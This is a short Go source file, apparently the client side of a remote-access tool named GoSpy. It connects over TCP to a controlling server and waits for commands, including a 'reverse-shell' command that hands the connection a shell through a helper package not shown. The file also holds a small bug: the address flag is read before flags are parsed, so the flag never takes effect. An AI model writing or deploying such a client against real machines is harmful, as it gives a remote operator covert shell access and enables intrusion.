package main

import (
	"flag"
	"github.com/psidex/GoSpy/internal/comms"
	"github.com/psidex/GoSpy/internal/gospy/shell"
	"log"
	"net"
	"os"
)

// ToDo: What happens if server drops?

func main() {
	address := *flag.String("a", "127.0.0.1:12345", "the address (ip:port) of the gospyserver to connect to")
	log.Printf("Using address %s\n", address)

	conn, err := net.Dial("tcp", address)
	if err != nil {
		log.Fatal(err)
	}

	for {
		message, err := comms.RecvStringFrom(conn)
		if err != nil {
			log.Fatal(err)
		}

		log.Printf("Recv: %s", string(message))

		switch message {

		case "exit":
			log.Println("Exiting")
			os.Exit(0)

		case "ping":
			err = comms.SendStringTo(conn, "pong")
			if err != nil {
				log.Printf("pong failed: %e\n", err)
			}

		case "reverse-shell":
			err = shell.StartReverseShell(conn)
			if err != nil {
				log.Printf("reverse-shell failed: %e\n", err)
			}

		}
	}
}
